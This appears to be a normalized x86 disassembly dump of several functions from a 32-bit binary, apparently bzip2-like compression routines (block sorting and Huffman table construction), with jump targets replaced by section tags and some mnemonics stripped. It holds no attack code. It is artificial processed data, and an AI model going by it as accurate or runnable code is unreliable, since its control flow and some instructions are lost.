add [ ebx + eax * 4 + 0x40 ] esi
cmp [ ebx + 0x28 ] dl
je r-xdata
movzx eax [ ebx + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
lea edx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] edx
lea edx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x28 ] 0x31
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x10 ]
inc eax
cmp eax [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
jl r-xdata
mov esi eax
and [ ebp - 0x10 ] 0x0
lea esi [ ebx + 0x40 ]
mov eax esi
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x30 ]
jge r-xdata
cmp [ ebp - 0x54 ] 0x1
jne r-xdata
add [ ebp - 0x20 ] eax
jmp r-xdata
cmp [ ebp - 0x20 ] edx
jle r-xdata
cmp esi edx
jle r-xdata
cmp ecx [ ebp - 0x18 ]
jg r-xdata
dec edi
cmp edi 0x10
jae r-xdata
add eax eax
cmp [ ebp - 0x28 ] 0x0
mov [ ebp - 0x74 ] eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx + eax * 2 ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp - 0x54 ]
cmp edi [ ebp - 0x64 ]
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
inc [ ebp - 0x10 ]
add eax 0x4
cmp [ ebp - 0x10 ] 0xff
jle r-xdata
mov esi edi
shr esi 0x4
lea eax [ ebx + esi * 4 + 0x1e7c ]
mov edx [ eax ]
and edi 0xf
add edi edx
cmp edi edx
mov cl [ ebx + edi + 0xe7c ]
jle r-xdata
mov edx [ ebx + 0x1e7c ]
lea eax [ ebx + edx ]
mov cl [ eax + edi + 0xe7c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x55 ] cl
cmp edi 0x3
jbe r-xdata
mov eax [ ebp - 0x5c ]
dec [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
cmp eax [ ebp - 0x50 ]
mov [ ebp - 0x24 ] eax
jge r-xdata
mov esi [ ebx + 0xc4c ]
mov [ esi + ecx * 4 ] eax
inc ecx
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] ecx
jg r-xdata
mov edi [ ebx + 0xc50 ]
movzx si cl
mov [ edi + eax * 2 ] si
inc eax
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] eax
jg r-xdata
mov ecx [ eax ]
test ecx ecx
jl r-xdata
and [ ebx + 0x444 ] 0x0
mov edx 0x100
lea eax [ ebx + 0x448 ]
mov ecx edx
mov edi eax
[ edi ] [ esi ]
mov ecx edx
inc [ eax ]
test esi esi
jle r-xdata
lea edx [ ebx + 0xe7c ]
test edi edi
jbe r-xdata
lea ecx [ ebx + 0xe7b ]
lea eax [ ecx + edx ]
mov edx ebx
sub edx ecx
add edx 0xe7c
mov [ ebp - 0x68 ] edx
mov edx ebx
sub edx ecx
add edx 0xe7a
mov [ ebp - 0x7c ] edx
mov edx ebx
sub edx ecx
add edx 0xe78
mov [ ebp - 0x78 ] edx
mov edx ebx
sub edx ecx
lea esi [ edi - 0x4 ]
add edx 0xe79
shr esi 0x2
add eax edi
mov [ ebp - 0x38 ] edx
inc esi
movzx eax [ ebx + eax + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
mov [ ebp - 0x5c ] ecx
lea ecx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] ecx
lea ecx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x28 ] 0x32
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] eax
cmp ecx [ ebp - 0x30 ]
jge r-xdata
jmp r-xdata
cmp eax [ ebp - 0x30 ]
jge r-xdata
jmp r-xdata
mov esi [ eax - 0x4 ]
add [ eax ] esi
add eax 0x4
dec ecx
jne r-xdata
and [ ebp - 0x10 ] ecx
lea eax [ ebx + 0x444 ]
lea eax [ ebx + 0x1e7c ]
dec [ eax ]
mov edx [ eax ]
mov [ ebx + edx + 0xe7c ] cl
cmp [ eax ] 0x0
jne r-xdata
mov edi eax
mov al [ edx + edi - 0x1 ]
mov [ edx + edi ] al
dec edi
lea eax [ ebx + esi * 4 + 0x1e7c ]
cmp edi [ eax ]
jg r-xdata
mov [ eax + 0xe7c ] cl
jmp r-xdata
lea esi [ eax + 0xe7c ]
mov cl [ eax ]
mov edx [ ebp - 0x68 ]
mov [ edx + eax ] cl
mov ecx [ ebp - 0x7c ]
add ecx eax
mov dl [ ecx ]
mov [ eax ] dl
mov edx [ ebp - 0x38 ]
mov dl [ edx + eax ]
mov [ ecx ] dl
mov ecx [ ebp - 0x78 ]
mov cl [ ecx + eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + eax ] cl
sub edi 0x4
sub eax 0x4
dec esi
jne r-xdata
mov eax [ ebp - 0xc ]
mov cl [ ebp - 0x55 ]
cmp ecx [ ebp - 0x18 ]
jg r-xdata
mov edx [ ebp - 0x18 ]
movzx eax cl
lea eax [ eax + ebx + 0xd7c ]
movzx ecx [ eax ]
lea ecx [ ebx + ecx * 4 + 0x40 ]
inc [ ecx ]
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov edi 0xfff
mov [ ebp - 0x38 ] 0xf
lea esi [ ebx + 0x1eb8 ]
dec [ edi ]
mov edx [ edi - 0x4 ]
mov eax [ edi ]
mov dl [ edx + ebx + 0xe8b ]
dec esi
sub edi 0x4
mov [ ebx + eax + 0xe7c ] dl
test esi esi
jg r-xdata
mov dl [ esi + edi - 0x1 ]
mov [ esi + edi ] dl
dec edi
jne r-xdata
inc [ ebp - 0x10 ]
add eax 0x4
cmp [ ebp - 0x10 ] edx
jle r-xdata
movzx eax [ eax ]
mov ecx [ ebx + 0xc4c ]
mov [ ecx + edx * 4 ] eax
movzx ax [ eax ]
mov ecx [ ebx + 0xc50 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ esi ]
add eax ebx
mov al [ eax + edx + 0xe7c ]
mov [ edi + ebx + 0xe7c ] al
dec edi
dec [ ebp - 0x68 ]
jns r-xdata
dec [ ebp - 0x38 ]
lea eax [ edi + 0x1 ]
mov [ esi ] eax
sub esi 0x4
cmp [ ebp - 0x38 ] 0x0
jge r-xdata
mov ecx [ eax ]
test ecx ecx
jl r-xdata
xor eax eax
inc eax
mov [ ebp - 0x10 ] eax
lea ecx [ ebx + 0x444 ]
mov eax [ ebp - 0x5c ]
dec [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
cmp eax [ ebp - 0x50 ]
mov [ ebp - 0x24 ] eax
jge r-xdata
inc [ ebp - 0x18 ]
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov [ ebp - 0x68 ] 0xf
inc [ ebp - 0x10 ]
add ecx 0x4
cmp [ ebp - 0x10 ] edx
jle r-xdata
movzx eax [ ebx + eax + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
mov [ ebp - 0x5c ] ecx
lea ecx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] ecx
lea ecx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x28 ] 0x32
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] eax
mov esi [ ecx ]
cmp esi [ ecx + 0x4 ]
jg r-xdata
and [ ebx + 0xc ] 0x0
or [ ebx + 0xc60 ] 0xffffffff
push 0x2
pop ecx
cmp [ ebx + 0x30 ] ecx
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x4 ] ecx
jl r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
pop ecx
xor eax eax
pop ecx
inc eax
xor esi esi
cmp [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] esi
jle r-xdata
xor edx edx
cmp [ ebp - 0x18 ] edx
lea edi [ ebx + 0x848 ]
mov ecx 0x101
lea esi [ ebx + 0x444 ]
[ edi ] [ esi ]
jle r-xdata
mov ecx [ ebx + 0xc4c ]
mov edx [ ebx + 0x34 ]
mov edx [ ecx + edx * 4 ]
mov esi [ ebx + 0x24 ]
shr edx 0x8
imul esi esi 0x186a0
mov [ ebx + 0x38 ] edx
xor edx edx
mov [ ebx + 0x440 ] edx
cmp [ ebx + 0x10 ] dl
je r-xdata
mov edx [ ebx + 0xc4c ]
movzx ecx [ edx + esi * 4 ]
lea ecx [ ebx + ecx * 4 + 0x444 ]
mov edi [ ecx ]
lea edx [ edx + edi * 4 ]
mov edi esi
shl edi 0x8
or [ edx ] edi
inc [ ecx ]
inc esi
cmp esi [ ebp - 0x18 ]
jl r-xdata
mov edx [ ebx + 0x34 ]
mov esi [ ebx + 0xc54 ]
mov ecx edx
sar ecx 0x1
movzx edi [ ecx + esi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr edi cl
mov ecx [ ebx + 0xc50 ]
movzx ecx [ ecx + edx * 2 ]
and edi 0xf
shl edi 0x10
or edi ecx
jmp r-xdata
mov ecx [ ebx + 0xc50 ]
lea ecx [ ecx + edx * 2 ]
movzx esi [ ecx ]
lea esi [ ebx + esi * 4 + 0x848 ]
mov di [ esi ]
mov [ ecx ] di
test dl 0x1
jne r-xdata
mov edx [ ebx + 0x38 ]
cmp edx esi
jae r-xdata
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x18 ] edx
mov edx [ ebx + 0x38 ]
cmp edx esi
jae r-xdata
mov [ ebp - 0x10 ] esi
mov esi [ ebx + 0xc54 ]
mov ecx edi
sar ecx 0x1
movzx esi [ esi + ecx ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x1c ] edi
and [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x1c ]
mov eax [ ebx + 0xc50 ]
shl cl 0x2
shr esi cl
lea eax [ eax + edi * 2 ]
movzx ecx [ eax ]
and esi 0xf
shl esi 0x10
or esi ecx
mov ecx [ ebp - 0x38 ]
mov [ eax ] dx
mov eax [ ebx + 0xc54 ]
add eax ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebx + 0xc54 ]
mov eax edx
sar eax 0x1
lea edi [ eax + ecx ]
mov eax [ esi ]
mov ecx [ esi ]
sar eax 0xc
xor al [ edi ]
sar ecx 0xc
and al 0xf
xor al cl
mov [ edi ] al
xor eax eax
inc eax
mov edi [ ebx + 0xc54 ]
mov ecx edx
sar ecx 0x1
add edi ecx
mov cl [ edi ]
and cl 0xf0
or cl [ esi + 0x2 ]
mov [ edi ] cl
jmp r-xdata
mov ecx [ ecx + edx * 4 ]
mov [ ebx + 0x38 ] ecx
shr [ ebx + 0x38 ] 0x8
movzx ecx cl
mov [ ebx + 0x3c ] ecx
mov [ ebx + 0x440 ] eax
jmp r-xdata
mov ecx [ ecx + edx * 4 ]
mov [ ebx + 0x38 ] ecx
shr [ ebx + 0x38 ] 0x8
movzx ecx cl
mov [ ebx + 0x3c ] ecx
mov [ ebx + 0x440 ] eax
mov ecx [ rw-data ]
mov [ ebx + 0x14 ] ecx
dec [ ebx + 0x14 ]
mov ecx [ ebx + 0x14 ]
xor edx edx
cmp ecx eax
sete dl
mov [ ebx + 0x18 ] eax
xor [ ebx + 0x3c ] edx
jmp r-xdata
mov ecx edx
sar ecx 0xc
xor cl [ eax ]
sar edx 0xc
and cl 0xf
xor cl dl
mov [ eax ] cl
mov cl [ eax ]
sar edx 0x10
and cl 0xf0
or dl cl
mov [ eax ] dl
jmp r-xdata
inc [ esi ]
inc edx
cmp edx [ ebp - 0x18 ]
jl r-xdata
xor eax eax
inc eax
mov eax [ ebx + 0x34 ]
xor ecx ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x10 ] edx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x440 ] ecx
cmp [ ebx + 0x10 ] cl
je r-xdata
mov edx edi
mov edi esi
cmp edx [ ebx + 0x34 ]
jne r-xdata
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
cmp eax ecx
jae r-xdata
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] ecx
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
cmp eax ecx
jb r-xdata
xor eax eax
inc eax
lea eax [ ebx + 0x444 ]
push eax
push [ ebx + 0x34 ]
call sub_10014f20
mov edx [ ebx + 0xc54 ]
mov [ ebx + 0x3c ] eax
mov eax [ ebx + 0x34 ]
pop ecx
pop ecx
mov ecx eax
shr ecx 0x1
movzx edx [ ecx + edx ]
movzx ecx al
and cl 0x1
shl cl 0x2
shr edx cl
mov ecx [ ebx + 0xc50 ]
movzx eax [ ecx + eax * 2 ]
and edx 0xf
shl edx 0x10
or edx eax
mov [ ebx + 0x38 ] edx
mov [ ebx + 0x440 ] 0x1
jmp r-xdata
lea eax [ ebx + 0x444 ]
push eax
push [ ebx + 0x34 ]
call sub_10014f20
mov edx [ ebx + 0x34 ]
mov esi eax
pop ecx
mov [ ebx + 0x3c ] esi
mov eax edx
shr eax 0x1
pop ecx
mov ecx [ ebx + 0xc54 ]
movzx eax [ eax + ecx ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr eax cl
mov ecx [ ebx + 0xc50 ]
movzx ecx [ ecx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
xor ecx ecx
inc ecx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x440 ] ecx
mov eax [ rw-data ]
mov [ ebx + 0x14 ] eax
dec [ ebx + 0x14 ]
mov edi [ ebx + 0x14 ]
xor eax eax
cmp edi ecx
sete al
mov [ ebx + 0x18 ] ecx
xor eax esi
mov [ ebx + 0x3c ] eax
sub_100193d4
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] edx
je r-xdata
leave
retn
mov ecx edx
sub ecx [ ebp + 0x8 ]
push ebx
cmp ecx 0x3
push esi
jle r-xdata
mov edx [ ebp + 0xc ]
jmp r-xdata
add edx 0xfffffffc
jmp r-xdata
dec edx
cmp edx [ ebp + 0x8 ]
jge r-xdata
cmp edx [ ebp + 0x8 ]
jge r-xdata
mov ecx [ eax + edx * 4 ]
mov ebx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ edx + 0x1 ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ eax + edx * 4 ]
mov ebx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ edx + 0x4 ]
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jle r-xdata
cmp ecx [ ebp + 0xc ]
jle r-xdata
mov esi [ eax + ecx * 4 ]
cmp ebx [ edi + esi * 4 ]
jbe r-xdata
mov esi [ ebp - 0x4 ]
mov [ eax + ecx * 4 - 0x4 ] esi
mov esi [ eax + ecx * 4 ]
cmp ebx [ edi + esi * 4 ]
jbe r-xdata
mov esi [ ebp - 0x4 ]
mov [ eax + ecx * 4 - 0x10 ] esi
dec edx
mov [ eax + ecx * 4 - 0x4 ] esi
inc ecx
mov [ eax + ecx * 4 - 0x10 ] esi
add ecx 0x4
sub_10019456
push ebp
mov ebp esp
sub esp 0x344
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov [ ebp - 0x344 ] eax
mov [ ebp + 0xc ] 0x1
push edi
push 0x3ec
call sub_100143a7
dec [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
shl eax 0x2
lea ecx [ ebp + eax - 0x1b4 ]
lea eax [ ebp + eax - 0x344 ]
mov ebx [ eax ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] ecx
mov ecx [ ecx ]
mov eax ebx
sub eax ecx
cmp eax 0xa
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ebx
jge r-xdata
mov eax [ ebp - 0x18 ]
imul eax eax 0x1dc5
inc eax
and eax 0x7fff
push 0x3
xor edx edx
pop edi
mov [ ebp - 0x18 ] eax
div edi
test edx edx
jne r-xdata
mov edi [ ebp + 0x8 ]
push ebx
push ecx
mov eax esi
call sub_100193d4
pop ecx
pop ecx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov eax [ esi + ecx * 4 ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov eax [ esi + ebx * 4 ]
lea eax [ ebx + ecx ]
sar eax 0x1
mov eax [ esi + eax * 4 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ecx
mov edi ecx
mov [ ebp - 0x10 ] ebx
mov eax ebx
cmp [ ebp + 0xc ] 0x63
jge r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
cmp [ ebp - 0x10 ] ecx
jl r-xdata
mov edx [ esi + edi * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
sub ecx [ ebp - 0x4 ]
jne r-xdata
mov ecx edi
sub ecx [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
cmp ecx edx
jge r-xdata
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ esi + ecx * 4 ]
mov [ esi + edi * 4 ] ecx
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
inc edi
cmp edi eax
mov [ esi + ecx * 4 ] edx
jle r-xdata
mov [ ebp - 0x4 ] edx
test edx edx
jle r-xdata
mov edx ecx
inc edi
jmp r-xdata
cmp edi eax
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx ebx
sub edx [ ebp - 0x10 ]
sub ecx eax
cmp edx ecx
jge r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx edi
sub ebx edx
lea ecx [ esi + ecx * 4 ]
lea edx [ esi + ebx * 4 ]
mov ebx [ ebp - 0xc ]
jmp r-xdata
mov ebx [ ebp - 0xc ]
mov edx [ esi + eax * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
sub ecx [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x4 ] ecx
test ecx ecx
jle r-xdata
mov ecx edx
mov ebx [ ecx ]
mov [ ebp - 0x8 ] ebx
mov ebx [ edx ]
mov [ ecx ] ebx
mov ebx [ ebp - 0x8 ]
mov [ edx ] ebx
add ecx 0x4
add edx 0x4
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov ebx [ ebp - 0xc ]
cmp edi eax
jg r-xdata
test ecx ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea ecx [ esi + ecx * 4 ]
mov ebx [ ecx ]
mov [ esi + eax * 4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
sub eax [ ebp - 0x10 ]
lea ecx [ ecx + edx - 0x1 ]
mov edi ecx
sub edi [ ebp - 0x14 ]
lea eax [ eax + ebx + 0x1 ]
mov edx ebx
sub edx eax
inc [ ebp + 0xc ]
cmp edi edx
jle r-xdata
lea edx [ esi + edi * 4 ]
mov edi ebx
sub edi ecx
lea ecx [ esi + edi * 4 + 0x4 ]
cmp edi eax
jg r-xdata
dec eax
cmp edi eax
jle r-xdata
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
shl eax 0x2
mov [ ebp + eax - 0x1b4 ] edx
mov [ ebp + eax - 0x344 ] ecx
mov edx [ ebp - 0x24 ]
mov [ edx ] ecx
mov ecx [ ebp + 0xc ]
shl ecx 0x2
mov [ ebp + ecx - 0x1b4 ] eax
mov [ ebp + ecx - 0x344 ] ebx
jmp r-xdata
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ ecx ]
mov [ edx ] edi
mov edi [ ebp - 0xc ]
mov [ ecx ] edi
add edx 0x4
add ecx 0x4
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov edx [ esi + eax * 4 ]
mov ecx [ esi + edi * 4 ]
mov [ esi + edi * 4 ] edx
mov [ esi + eax * 4 ] ecx
inc edi
dec eax
inc [ ebp + 0xc ]
sub_10019692
push ebp
mov ebp esp
sub esp 0x810
cmp [ ebp + 0x14 ] 0x4
push ebx
push esi
push edi
mov ebx eax
jl r-xdata
mov edx 0x101
xor eax eax
mov ecx edx
lea edi [ ebp - 0x410 ]
[ edi ]
mov eax [ ebp + 0x10 ]
xor esi esi
test eax eax
jle r-xdata
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
pop ecx
pop ecx
mov ecx 0x100
lea esi [ ebp - 0x410 ]
lea edi [ ebp - 0x810 ]
[ edi ] [ esi ]
xor esi esi
inc esi
mov ecx [ ebp + 0xc ]
movzx ecx [ esi + ecx ]
lea ecx [ ebp + ecx * 4 - 0x410 ]
inc [ ecx ]
inc esi
cmp esi eax
jl r-xdata
mov edi [ ebp + esi * 4 - 0x414 ]
lea ecx [ ebp + esi * 4 - 0x410 ]
add [ ecx ] edi
inc esi
cmp esi edx
jl r-xdata
xor edi edi
test eax eax
jle r-xdata
cdq
and edx 0x1f
add eax edx
sar eax 0x5
inc eax
inc eax
test eax eax
jle r-xdata
mov ecx [ ebp + 0xc ]
movzx ecx [ edi + ecx ]
lea edx [ ebp + ecx * 4 - 0x410 ]
mov ecx [ edx ]
dec ecx
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] edi
inc edi
cmp edi eax
jl r-xdata
xor edx edx
mov ecx eax
xor eax eax
mov edi ebx
[ edi ]
mov ecx [ ebp + edx * 4 - 0x410 ]
xor esi esi
mov eax ecx
and ecx 0x1f
inc esi
shl esi cl
sar eax 0x5
lea eax [ ebx + eax * 4 ]
or [ eax ] esi
inc edx
cmp edx 0x100
jl r-xdata
mov edx [ ebp + 0x10 ]
push 0x20
pop esi
xor edi edi
inc edi
mov ecx edx
and ecx 0x1f
shl edi cl
mov eax edx
sar eax 0x5
lea eax [ ebx + eax * 4 ]
or [ eax ] edi
lea ecx [ edx + 0x1 ]
xor edi edi
inc edi
mov eax ecx
and ecx 0x1f
shl edi cl
sar eax 0x5
lea eax [ ebx + eax * 4 ]
not edi
and [ eax ] edi
inc edx
inc edx
dec esi
jne r-xdata
mov [ ebp - 0x8 ] 0x1
xor edx edx
xor esi esi
cmp [ ebp + 0x10 ] edx
jle r-xdata
push [ ebp - 0x8 ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0xc
and [ ebp - 0xc ] 0x0
or edi 0xffffffff
xor eax eax
mov ecx edx
and ecx 0x1f
inc eax
shl eax cl
mov ecx edx
sar ecx 0x5
test [ ebx + ecx * 4 ] eax
je r-xdata
xor esi esi
mov ecx eax
and ecx 0x1f
inc esi
shl esi cl
mov edx eax
sar edx 0x5
test [ ebx + edx * 4 ] esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + edx * 4 ]
sub eax [ ebp - 0x8 ]
jns r-xdata
mov esi edx
test ecx ecx
je r-xdata
mov ecx eax
sar ecx 0x5
mov edx [ ebx + ecx * 4 ]
push 0x1f
xor edi edi
mov ecx eax
pop esi
and ecx esi
inc edi
shl edi cl
test edx edi
je r-xdata
mov ecx [ ebp + 0xc ]
inc edx
cmp edx [ ebp + 0x10 ]
mov [ ecx + eax * 4 ] esi
jl r-xdata
add eax [ ebp + 0x10 ]
inc eax
lea ecx [ eax - 0x1 ]
cmp ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
jge r-xdata
cmp edx 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0x4
jl r-xdata
mov ecx eax
and ecx esi
jmp r-xdata
xor edx edx
mov ecx eax
and ecx esi
inc edx
shl edx cl
mov ecx eax
sar ecx 0x5
test [ ebx + ecx * 4 ] edx
jne r-xdata
add eax 0x20
mov ecx eax
sar ecx 0x5
cmp [ ebx + ecx * 4 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x8 ]
add eax eax
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0xc ]
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
add esp 0xc
xor esi esi
inc esi
shl esi cl
mov edx eax
sar edx 0x5
test [ ebx + edx * 4 ] esi
je r-xdata
inc eax
jmp r-xdata
cmp [ ebp + 0x14 ] 0x4
jl r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx eax
sar ecx 0x5
mov edx [ ebx + ecx * 4 ]
xor esi esi
mov ecx eax
and ecx 0x1f
inc esi
shl esi cl
test edx esi
jne r-xdata
xor esi esi
xor ecx ecx
xor edx edx
cmp [ ebp + 0x10 ] esi
jle r-xdata
push r--data
call sub_10022fff
add eax 0x40
push eax
call sub_100231b4
pop ecx
pop ecx
cmp [ ebp + 0x14 ] 0x4
jl r-xdata
inc eax
mov ecx eax
and ecx 0x1f
lea edi [ eax - 0x1 ]
cmp edi [ ebp + 0x10 ]
jge r-xdata
test edx edx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x810 ]
mov eax [ ebp - 0x4 ]
cmp edi eax
jle r-xdata
xor edx edx
mov ecx eax
and ecx 0x1f
inc edx
shl edx cl
mov ecx eax
sar ecx 0x5
test [ ebx + ecx * 4 ] edx
je r-xdata
add eax 0x20
mov ecx eax
sar ecx 0x5
cmp [ ebx + ecx * 4 ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
mov edi [ edi + edx * 4 ]
mov ebx [ ebp + 0xc ]
lea eax [ ebp + ecx * 4 - 0x810 ]
dec [ eax ]
inc edx
cmp edx [ ebp + 0x10 ]
mov [ ebx + edi ] cl
jl r-xdata
inc ecx
cmp [ ebp + ecx * 4 - 0x810 ] esi
je r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
mov ecx edi
sub ecx eax
push edi
push [ ebp + 0xc ]
lea ecx [ edx + ecx + 0x1 ]
mov [ ebp - 0xc ] ecx
call sub_10019456
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
or eax 0xffffffff
jmp r-xdata
inc eax
jmp r-xdata
cmp [ eax ] esi
jne r-xdata
cmp ecx 0x100
jl r-xdata
cmp edx edi
jle r-xdata
push 0x3ed
call sub_100143a7
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov esi [ ebp + 0xc ]
mov ecx [ esi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
jmp r-xdata
inc edx
xor esi esi
mov ecx edx
and ecx 0x1f
inc esi
mov eax edx
sar eax 0x5
shl esi cl
lea eax [ ebx + eax * 4 ]
or [ eax ] esi
mov eax [ ebp - 0x4 ]
sub_100199e9
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi edx
mov dl [ edi + eax ]
mov bl [ esi + eax ]
cmp bl dl
je r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
sbb eax eax
neg eax
jmp r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
mov edx [ ebp + 0xc ]
inc edi
inc esi
add edx 0x8
mov [ ebp + 0x8 ] edx
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
